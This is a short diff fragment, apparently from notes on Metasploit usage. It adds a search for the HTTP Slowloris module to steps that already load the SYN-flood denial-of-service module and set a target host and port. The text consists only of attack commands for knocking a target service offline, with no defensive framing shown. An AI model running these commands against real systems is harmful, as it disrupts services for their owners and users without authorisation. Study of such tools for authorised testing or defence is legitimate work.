@@ -3,6 +3,8 @@
 
 a) msfconsole
 
+search http-slowloris
+
 use auxiliary/dos/tcp/synflood
 set rhost IP
 set rport PORT
